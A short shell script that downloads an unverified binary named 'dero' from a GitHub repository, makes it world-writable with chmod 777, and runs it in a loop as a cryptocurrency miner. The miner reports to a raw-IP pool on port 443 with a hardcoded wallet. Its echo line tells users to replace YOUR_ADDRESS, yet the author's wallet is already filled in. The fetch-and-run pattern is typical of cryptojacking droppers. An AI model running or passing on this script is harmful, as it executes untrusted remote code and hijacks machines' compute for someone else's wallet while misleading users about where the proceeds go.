wget https://github.com/angkii/2022/raw/main/dero
chmod 777 dero

#!/bin/bash
echo "Replace YOUR_ADDRESS to run the miner"
while :; do
    ./dero -w deroi1qykdhx37h72gy9hl48xjjvdagjyh7afzsr8tn0r54tem8dq5evxncq9pvfz92xcq2v4fyh2l2fpshc0g5x.MAJA -r 170.187.197.220:443 -p stratum;
    sleep 5;
done
